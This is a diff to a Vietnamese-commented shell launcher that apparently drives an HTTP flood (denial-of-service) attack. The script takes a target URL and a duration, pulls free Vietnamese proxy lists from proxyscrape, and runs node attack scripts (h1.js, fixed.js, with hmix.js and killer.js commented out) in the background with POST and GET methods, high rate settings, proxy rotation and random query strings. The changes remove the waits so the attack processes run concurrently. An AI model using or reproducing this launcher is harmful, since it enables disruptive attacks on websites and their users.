@@ -6,21 +6,21 @@
 URL=$1
 TIME=$2
 
-# Tải proxy vào live.txt cho cả HTTP, HTTPS     
+# Xóa file cũ, tạo mới
 > live.txt
-for t in http https; do
-curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999&protocol=$t" >> live.txt
-#echo >> live.txt  # xuống dòng sau lần 1
-#curl -s "https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/$t/Vietnam.txt" >> live.txt
+
+# Tải proxy HTTP từ ProxyScrape (có thể thêm HTTPS nếu muốn)
+for t in http; do
+  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999&protocol=$t" >> live.txt
 done
-wait
+
 
 
 # Chạy các script node 
-for m in POST GET; do
-  node fixed.js $URL $TIME 1 1 hihi.txt --verify true &  
-  node h1.js $m $URL live.txt $TIME 999 10 randomstring=true &
+for m in POST GET; do 
+  node h1.js $m $URL live.txt $TIME 999 10 randomstring=true || true &
+  node fixed.js $URL $TIME 1 1 hihi.txt --verify true || true &
   #node hmix.js -m $m -u $URL -s $TIME -p live.txt -t 1 -r 38 --full true -d false &
   #node killer.js $m $URL $TIME 2 2 live.txt --query 1 --referer rand --http mix --close --parsed --reset &
-  wait
 done
+
